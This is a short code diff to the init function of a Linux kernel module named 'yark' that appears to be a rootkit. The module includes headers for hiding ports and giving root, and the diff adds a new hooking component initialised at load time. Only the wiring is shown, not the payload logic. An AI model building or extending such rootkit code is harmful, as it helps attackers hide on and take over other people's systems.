@@ -4,15 +4,16 @@
 #include "command.h"
 #include "hide_port.h"
 #include "main.h"
-
+#include "yhook.h"
 #include "give_root.h"
 
-
-static int __init yark_init(void)
-{
+static int __init yark_init(void) {
     pr_info(LOG_PREFIX "call yark_init()\n");
+    yhook_init();
+
     hide_port_init();
     command_start();
+
     return 0;
 }
 
